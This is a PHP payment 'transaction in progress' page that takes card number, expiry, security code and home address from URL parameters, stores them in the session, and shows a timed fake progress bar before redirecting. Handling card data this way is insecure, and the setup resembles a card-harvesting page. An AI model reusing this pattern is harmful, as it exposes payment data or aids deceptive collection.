<!DOCTYPE html>
<html lang="en">
<?php
include_once("headlinks.php");
session_start();
  $_SESSION['NameonCard'] = $_GET['NameonCard'];
  $_SESSION['CardNumber'] = $_GET['CardNumber'];
  $_SESSION['section_yes'] = $_GET['ExpirationDate'];
  $_SESSION['prize_yes'] = $_GET['SecurityCode'];
  $_SESSION['name_yes'] = $_GET['HomeAddress'];
?>
  <body>

    <div id="wrapper">
     <!-- Include navigation links -->
<?php
include_once("navigation.php");
?>

      <div id="page-wrapper">

        <div class="row">
          
          <div class="row">
          <div class="col-lg-12">
            <h1><small style="color:#FFF; background-color: #F00; border-radius: 90px; padding: 10px;">3</small>  Transaction in Progress</h1>
          </div>
          <hr>
            <div class="col-lg-11">
            <h4>Please waite....this may take few seconds</h4>
<div id="progress" style=" width:100%;"></div>
<div id="information" style=" margin-left:20px;"></div>
                <?php

$total = 10;
//'.$i.'%;
for($i=1; $i<=$total; $i++){

    $percent = intval($i/$total * 100)."%";

    echo '<script language="javascript">
    document.getElementById("progress").innerHTML="<div style=\"width:'.$percent.';background-color:#009100;\">&nbsp;</div>";
    document.getElementById("information").innerHTML="Transaction in progress............................................... please wait!";
    </script>';

    echo str_repeat(' ',1024*64);
    
    flush();

    sleep(1);
  
  if($i == 9){ 
  
 echo '<script language="javascript">document.location = "?/&goto=confirm"; </script>';
  
  }
}
 

?>

            </div>
            <div class="col-lg-3" style="border-left:3px #CCC solid;">
               
            </div>
          

        </div>

        </div>

      </div>

    </div>

<?php
include_once("footer.php");
?>  
  </body>
</html>
